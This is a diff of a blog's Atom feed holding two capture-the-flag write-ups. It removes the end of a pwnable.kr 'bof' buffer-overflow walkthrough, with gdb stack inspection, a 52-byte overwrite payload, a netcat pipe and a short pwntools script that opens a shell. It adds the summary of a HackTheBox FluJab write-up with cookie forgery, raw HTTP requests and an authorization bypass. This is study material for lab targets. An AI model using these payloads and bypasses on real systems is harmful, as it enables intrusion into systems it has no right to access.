-&lt;p&gt;&lt;img src=&quot;/images/pwn/bof/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;it-stopped-at-the-break-point-we-need-to-disassemble-the-function-func-to-get-the-address-of-the-compare-instruction-that-compares-between-the-value-of-key-and-0xcafebabe-to-set-another-break-point-there-and-look-at-the-stack&quot;&gt;It stopped at the break point. We need to disassemble the function &lt;code class=&quot;highlighter-rouge&quot;&gt;func()&lt;/code&gt; to get the address of the compare instruction that compares between the value of &lt;code class=&quot;highlighter-rouge&quot;&gt;key&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;0xcafebabe&lt;/code&gt; to set another break point there and look at the stack.&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;disas func&lt;/code&gt;
-&lt;img src=&quot;/images/pwn/bof/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;we-can-see-the-cmpl-compare-logical-instruction-at-0x0000654-lets-set-a-break-point-exactly-before-it-&quot;&gt;We can see the &lt;a href=&quot;https://www.ibm.com/support/knowledgecenter/en/ssw_aix_72/com.ibm.aix.alangref/idalangref_comp_logical_inst.htm&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;cmpl&lt;/code&gt; (Compare Logical)&lt;/a&gt; instruction at &lt;code class=&quot;highlighter-rouge&quot;&gt;0x0000654&lt;/code&gt;, Lets set a break point exactly before it :&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;break *0x80000654&lt;/code&gt;
-&lt;img src=&quot;/images/pwn/bof/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;now-lets-continue-the-execution-c-and-wait-for-our-break-point&quot;&gt;Now let’s continue the execution (&lt;code class=&quot;highlighter-rouge&quot;&gt;c&lt;/code&gt;) and wait for our break point.&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/pwn/bof/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;i-gave-it-a-short-input-because-we-dont-need-to-crash-it-and-overwrite-stuff-on-the-stack-we-just-need-to-look-at-the-stack-during-a-normal-execution-to-locate-0xdeadbeef&quot;&gt;I gave it a short input because we don’t need to crash it and overwrite stuff on the stack, we just need to look at the stack during a normal execution to locate &lt;code class=&quot;highlighter-rouge&quot;&gt;0xdeadbeef&lt;/code&gt;.&lt;/h4&gt;
-&lt;h4 id=&quot;after-hitting-the-second-break-point-lets-look-at-the-stack-&quot;&gt;After hitting the second break point let’s look at the stack :&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;x/50wx $esp&lt;/code&gt;
-&lt;img src=&quot;/images/pwn/bof/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;0xdeadbeef-appears-at-the-first-row-in-front-of-0xbffff2e0-and-our-input-starts-to-appear-at-the-last-row-in-front-of-0xbffff2a0-we-can-locate-the-distance-between-our-input-and-0xdeadbeef-easily-each-hex-value-represents-4-chars-0x41414141--aaaa-and-we-have-exactly-13-of-them-before-0xdeadbeef-1--4--4--4&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;0xdeadbeef&lt;/code&gt; appears at the first row in front of &lt;code class=&quot;highlighter-rouge&quot;&gt;0xbffff2e0&lt;/code&gt; and our input starts to appear at the last row in front of &lt;code class=&quot;highlighter-rouge&quot;&gt;0xbffff2a0&lt;/code&gt;. We can locate the distance between our input and &lt;code class=&quot;highlighter-rouge&quot;&gt;0xdeadbeef&lt;/code&gt; easily, each hex value represents 4 chars (&lt;code class=&quot;highlighter-rouge&quot;&gt;0x41414141 == AAAA&lt;/code&gt;) and we have exactly 13 of them before &lt;code class=&quot;highlighter-rouge&quot;&gt;0xdeadbeef&lt;/code&gt; (&lt;code class=&quot;highlighter-rouge&quot;&gt;1 + 4 + 4 + 4&lt;/code&gt;).&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/pwn/bof/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;we-need-to-give-the-program-exactly-52-chars-then-0xcafebabe-and-eventually-0xdeadbeef-will-be-overwritten&quot;&gt;We need to give the program exactly 52 chars then &lt;code class=&quot;highlighter-rouge&quot;&gt;0xcafebabe&lt;/code&gt; and eventually &lt;code class=&quot;highlighter-rouge&quot;&gt;0xdeadbeef&lt;/code&gt; will be overwritten.&lt;/h4&gt;
-&lt;h4 id=&quot;lets-try-it-i-used-python-to-print-the-payload-in-a-file-then-i-piped-that-file-to-the-nc-connection-&quot;&gt;Let’s try it, I used python to print the payload in a file then I piped that file to the &lt;code class=&quot;highlighter-rouge&quot;&gt;nc&lt;/code&gt; connection :&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;python -c &quot;print 'A' * 52 + '\xbe\xba\xfe\xca'&quot; &amp;gt; ./payload&lt;/code&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;code class=&quot;highlighter-rouge&quot;&gt;(cat payload &amp;amp;&amp;amp; cat) | nc pwnable.kr 9000&lt;/code&gt;
-&lt;img src=&quot;/images/pwn/bof/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;pwned-&quot;&gt;Pwned !&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;writing-an-exploit-with-pwntools&quot;&gt;Writing an Exploit with pwntools&lt;/h3&gt;
-&lt;h4 id=&quot;one-of-the-cool-things-about-pwntools-is-the-simplicity-combined-with-the-simplicity-of-this-exploit-will-make-it-just-4-lines-of-code&quot;&gt;One of the cool things about &lt;code class=&quot;highlighter-rouge&quot;&gt;pwntools&lt;/code&gt; is the simplicity, combined with the simplicity of this exploit will make it just 4 lines of code.&lt;/h4&gt;
-&lt;h4 id=&quot;first-thing-we-need-to-do-is-to-import-pwntools--from-pwn-import-&quot;&gt;First thing we need to do is to import &lt;code class=&quot;highlighter-rouge&quot;&gt;pwntools&lt;/code&gt; : &lt;code class=&quot;highlighter-rouge&quot;&gt;from pwn import *&lt;/code&gt;&lt;/h4&gt;
-&lt;h4 id=&quot;we-need-to-store-our-payload-in-a-variable--payload--a--52--xbexbaxfexca&quot;&gt;We need to store our payload in a variable : &lt;code class=&quot;highlighter-rouge&quot;&gt;payload = 'A' * 52 + '\xbe\xba\xfe\xca'&lt;/code&gt;&lt;/h4&gt;
-&lt;h4 id=&quot;then-we-need-to-initiate-the-connection-and-assign-a-variable-for-it--shell--remotepwnablekr-9000&quot;&gt;Then we need to initiate the connection and assign a variable for it : &lt;code class=&quot;highlighter-rouge&quot;&gt;shell = remote('pwnable.kr' ,9000)&lt;/code&gt;&lt;/h4&gt;
-&lt;h4 id=&quot;after-that-we-will-send-the-payload--shellsendpayload&quot;&gt;After that we will send the payload : &lt;code class=&quot;highlighter-rouge&quot;&gt;shell.send(payload)&lt;/code&gt;&lt;/h4&gt;
-&lt;h4 id=&quot;and-finally-we-can-interact-with-our-shell--shellinteractive&quot;&gt;And finally we can interact with our shell : &lt;code class=&quot;highlighter-rouge&quot;&gt;shell.interactive()&lt;/code&gt;&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/pwn/bof/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/python&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'A'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;52&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xbe\xba\xfe\xca&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'pwnable.kr'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;9000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;img src=&quot;/images/pwn/bof/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;pwned-again-&quot;&gt;Pwned again !&lt;/h4&gt;
-&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
-&lt;h4 id=&quot;dont-forget-to-read-the-other-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;other write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
-&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
-&lt;h4 id=&quot;previous-pwn-write-up--pwnablekr---fd&quot;&gt;Previous pwn write-up : &lt;a href=&quot;/pwn/fd/&quot;&gt;pwnable.kr - fd&lt;/a&gt;&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;</content><author><name></name></author><category term="Linux" /><category term="Binary Exploitation" /><category term="Buffer Overflow" /><category term="code analysis" /><category term="Exploit Development" /><category term="c" /><category term="Python" /><summary type="html">Introduction Hey guys it’s been a long time since my first pwn write-up, today I’ll write about another challenge from pwnable.kr called bof. It was a simple easy buffer overflow challenge (You can also check these), by overwriting a variable we can get a shell. I’ll also write a small exploit with pwntools that spawns a shell automatically. Challenge Description ``` Nana told me that buffer overflow is one of the most common software vulnerability. Is that true?</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/pwn/bof/0.png" /></entry></feed>
+&lt;hr /&gt;</content><author><name></name></author><category term="Linux" /><category term="Web" /><category term="SQLI" /><category term="ssh" /><category term="rbash" /><category term="Binary Exploitation" /><category term="c" /><summary type="html">Quick Summary Hey guys today FluJab retired and here’s my write-up about it. This machine had a lot of rabbit holes and trolls which made it hard to enjoy the machine. But without mentioning those annoying things this machine had some really cool web exploitation parts like cookie manipulation, authentication bypasses and most importantly an interesting SQL injection vulnerability. Ajenti administration panel was installed on the box and I could get credentials for it by exploiting the SQLi, After that I could use a user’s public ssh key to get the private key as it was vulnerable to CVE-2008-0166 then I escaped rbash and exploited a vulnerable version of screen to get a root shell. It’s a Linux box and its ip is 10.10.10.124, I added it to /etc/hosts as flujab.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC flujab.htb We got ssh on port 22, http on ports 80 and 8080 and https on port 443. There’s also some sort of virtual hosting as we can see from the nmap scan and there are a lot of domains … We can also check the ssl certificate manually : HTTP I added all of them to /etc/hosts and checked them, However I will skip the rabbit holes in the write-up because it’s just a waste of time. If we take a look at what we have : The machine name is flujab so we are only interested in : console.flujab.htb sys.flujab.htb smtp.flujab.htb freeflujab.htb flujab.htb We saw that error about direct ip access when we visited flujab.htb, Let’s check the other 4. console.flujab.htb : Just a troll ! sys.flujab.htb : The same error on flujab.htb smtp.flujab.htb : We don’t have any credentials for that. freeflujab.htb : That one is interesting. I tried to run gobuster but there was a wildcard response. When I checked manually I found that instead of responding with 404 it responds with a redirection to https://clownware.htb/cwerror_pages.php which has a gif of a strange creepy clown … Note : I checked them all on port 8080 too but I always got the direct ip access error. I started burp and configured the scope : Then I ran the spider : Results : I checked the requests and the responses of different pages and actions. I noticed in one of the responses a Set-Cookie header that sets a cookie called Modus and sets the path for it to /?smtp_config. I requested /?smtp_config in the browser and looked at the request in burp : Request : Response : The response was a redirection to /?denied. We are sending 3 cookies in every request : Modus , Patient and Registered. Modus and Registered are base-64 encoded strings while Patient is an md5 hash. Modus = Configure=Null Registered = f991b5fb6a2939471c7230b2db78225e=Null Registered is using the same hash from Patient, After some guesses I found that this hash is for my ip : Anyway we can try to change these values from Null to True and see what happens : Request : GET /?smtp_config HTTP/1.1 Host: freeflujab.htb User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Cookie: Modus=Q29uZmlndXJlPVRydWU%3d; Patient=f991b5fb6a2939471c7230b2db78225e; Registered=Zjk5MWI1ZmI2YTI5Mzk0NzFjNzIzMGIyZGI3ODIyNWU9VHJ1ZQo%3d Connection: close Upgrade-Insecure-Requests: 1 Response : HTTP/1.1 200 OK Date: Thu, 15 Jun 2019 10:34:17 GMT Content-Type: text/html; charset=UTF-8 Connection: close Server: ClownWare Proxy Content-Length: 3735 Great, we can access the page now. Before doing anything I noticed this message about the whitelist: I requested /?whitelist and looked at the response : My ip wasn’t there. Anyway I used python to run a debugging smtp server : python -m smtpd -n -c DebuggingServer 10.10.xx.xx:25 Then I went to update the smtp settings and add mine : But I got this message : A Valid SMTP Domain Address Is Required. So I checked the source of the form : &amp;lt;form method=&quot;post&quot; action=&quot;?smtp_config&quot;&amp;gt; &amp;lt;div class=&quot;row aln-center&quot;&amp;gt; &amp;lt;div class=&quot;col-6 &quot;&amp;gt; &amp;lt;input type=&quot;text&quot; name=&quot;mailserver&quot; id=&quot;email-server&quot; value=&quot;smtp.flujab.htb&quot; pattern=&quot;smtp.[A-Za-z]{1,255}.[A-Za-z]{2,5}&quot; title=&quot; A Valid SMTP Domain Address Is Required&quot;/&amp;gt; &amp;lt;input type=&quot;hidden&quot; name=&quot;port&quot; id=&quot;port&quot; placeholder=&quot;25&quot; value=&quot;25&quot; /&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;div class=&quot;col-12&quot;&amp;gt; &amp;lt;p&amp;gt; WARNING: Only &amp;lt;a href=&quot;/?whitelist&quot;&amp;gt;whitelisted sysadmins&amp;lt;/a&amp;gt; are authorized to access this page! &amp;lt;br \&amp;gt; If you are not supposed to change these settings then don't! whitelist will be auto-updated. &amp;lt;/p&amp;gt; &amp;lt;ul class=&quot;actions&quot;&amp;gt; &amp;lt;li&amp;gt;&amp;lt;input type=&quot;submit&quot; class=&quot;style1&quot; value=&quot;Save Mail Server Config&quot; name=&quot;save&quot; /&amp;gt;&amp;lt;/li&amp;gt; &amp;lt;/ul&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;/form&amp;gt; It’s relying on client-side validation check : Which means that we can bypass it easily by sending the data directly in the request : Request : ``` POST /?smtp_config HTTP/1.1 Host: freeflujab.htb User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Cookie: Modus=Q29uZmlndXJlPVRydWU%3d; Patient=f991b5fb6a2939471c7230b2db78225e; Registered=Zjk5MWI1ZmI2YTI5Mzk0NzFjNzIzMGIyZGI3ODIyNWU9VHJ1ZQo%3d Connection: close Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded Content-Length: 59</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/flujab/0.png" /></entry></feed>
